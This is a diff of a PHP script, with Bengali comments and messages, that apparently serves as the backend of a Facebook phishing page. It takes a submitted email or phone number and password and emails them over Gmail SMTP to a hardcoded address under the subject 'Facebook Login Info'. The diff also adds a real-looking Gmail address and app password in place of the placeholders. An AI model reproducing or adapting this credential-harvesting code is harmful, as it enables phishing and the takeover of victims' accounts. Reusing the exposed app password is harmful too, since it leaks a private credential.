@@ -15,21 +15,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host = 'smtp.gmail.com';
         $mail->SMTPAuth = true;
-        $mail->Username = 'yourgmail@gmail.com'; // আপনার Gmail
-        $mail->Password = 'your_app_password';   // Gmail App Password
+        $mail->Username = 'hastehena12@gmail.com'; // আপনার Gmail
+        $mail->Password = 'idmk yapf bhuc ghqa';   // Gmail App Password
         $mail->SMTPSecure = 'tls';
         $mail->Port = 587;
 
-        $mail->setFrom('yourgmail@gmail.com', 'Login Info');
-        $mail->addAddress('yourgmail@gmail.com'); // নিজেরই Gmail এ পাঠানো
+        $mail->setFrom('hastehena12@gmail.com', 'Login Info');
+        $mail->addAddress('hastehena12@gmail.com');
 
-        $mail->Subject = 'নতুন লগইন তথ্য';
+        $mail->Subject = 'Facebook Login Info';
         $mail->Body = "ইমেইল/মোবাইল: $email\nপাসওয়ার্ড: $password";
 
         $mail->send();
         echo "✅ তথ্য সফলভাবে পাঠানো হয়েছে!";
     } catch (Exception $e) {
-        echo "❌ ইমেইল পাঠাতে ব্যর্থ হয়েছে। Error: {$mail->ErrorInfo}";
+        echo "❌ ইমেইল পাঠানো যায়নি। Error: {$mail->ErrorInfo}";
     }
 }
 ?>
